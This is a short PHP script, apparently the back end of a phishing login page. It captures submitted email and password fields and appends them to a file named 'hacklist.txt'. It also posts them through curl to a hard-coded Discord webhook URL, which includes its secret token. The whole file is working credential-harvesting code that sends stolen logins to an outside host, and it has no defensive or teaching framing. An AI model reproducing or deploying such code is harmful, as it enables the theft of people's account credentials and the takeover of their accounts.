<?php

    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            
        $username = isset($_POST['email']) ? $_POST['email'] : '';
        $password = isset($_POST['pass']) ? $_POST['pass'] : '';
            echo $username;
            echo $password;                                               
            file_put_contents('hacklist.txt', "USERNAME=$username, PASSWORD=$password", FILE_APPEND);
            
            $webhook_url = 'https://discord.com/api/webhooks/1215539364105420800/xxAVUnAMvyCfhZnGjYLh_ZIOvBhK58lmZBsKFTnQDsA0no16HE4Yh1cQC1nvtZEaxfKi';
            $msg = ["content" => "USERNAME: $username PASSWORD : $password" ];
            $headers = array('Content-Type: application/json');
            $ch = curl_init();
            curl_setopt( $ch,CURLOPT_URL, $webhook_url);
            curl_setopt( $ch,CURLOPT_POST, true);
            curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers);
            curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true);
            curl_setopt( $ch,CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt( $ch,CURLOPT_POSTFIELDS, json_encode( $msg));
            $response = curl_exec( $ch );
            curl_close( $ch );
            echo $response;
    }